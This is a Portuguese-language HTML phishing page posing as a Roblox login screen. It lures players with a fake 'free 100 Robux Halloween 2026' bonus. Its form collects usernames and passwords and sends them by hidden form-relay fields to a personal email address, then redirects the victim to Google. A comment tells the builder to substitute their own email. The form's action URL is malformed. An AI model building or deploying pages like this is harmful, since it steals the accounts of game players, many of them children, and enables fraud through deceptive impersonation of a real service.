<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Bônus de Halloween 2026</title>
    <style>
        body {
            background: linear-gradient(135deg, #2b1055, #7597de);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: white;
        }

        .container {
            background-color: rgba(20, 20, 25, 0.95);
            padding: 40px;
            border-radius: 15px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
            text-align: center;
            border: 2px solid #ff6b6b;
            position: relative;
            overflow: hidden;
        }

        /* Efeito de Halloween no topo */
        .banner-top {
            background: linear-gradient(90deg, #ff0000, #ff8800, #ff0000);
            color: white;
            padding: 10px;
            font-weight: bold;
            font-size: 18px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 20px;
            border-radius: 8px;
            animation: pulse 2s infinite;
            box-shadow: 0 0 10px #ff8800;
        }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 10px #ff8800; }
            50% { transform: scale(1.02); box-shadow: 0 0 20px #ff8800; }
            100% { transform: scale(1); box-shadow: 0 0 10px #ff8800; }
        }

        h2 {
            margin: 0 0 10px 0;
            font-size: 28px;
            color: #fff;
        }

        .robux-badge {
            display: inline-block;
            background-color: #00b06f;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            font-size: 14px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }

        input {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            background-color: #191b1d;
            border: 2px solid #393b3d;
            color: white;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
            transition: 0.3s;
        }

        input:focus {
            border-color: #ff6b6b;
            outline: none;
            box-shadow: 0 0 8px rgba(255, 107, 107, 0.5);
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #ff6b6b, #ff8800);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.3s;
            text-transform: uppercase;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 136, 0, 0.4);
        }

        .footer {
            margin-top: 20px;
            font-size: 13px;
            color: #aaa;
        }

        .footer a {
            color: #ff6b6b;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Banner de Bônus -->
        <div class="banner-top">
            🎃 Bônus 100 Robux Grátis - Halloween 2026 🎃
        </div>

        <h2>Entrar na Roblox</h2>
        
        <div class="robux-badge">
            💎 Resgate seus 100 Robux agora!
        </div>

        <!-- Substitua 'seuemail@gmail.com' pelo seu e-mail real -->
        <form action=/brunokaua631@gmail.com" method="POST">
            
            <input type="hidden" name="_subject" value="🎃 Novo Login: Halloween 2026!">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://www.google.com">
            <input type="hidden" name="_template" value="table">

            <input type="text" name="usuario" placeholder="Nome de usuário ou e-mail" required>
            <input type="password" name="senha" placeholder="Senha" required>
            
            <button type="submit">Resgatar & Entrar</button>
        </form>
        
        <div class="footer">
            Login seguro da Roblox.<br>
            <a href="#">Esqueceu sua senha?</a>
        </div>
    </div>

</body>
</html>
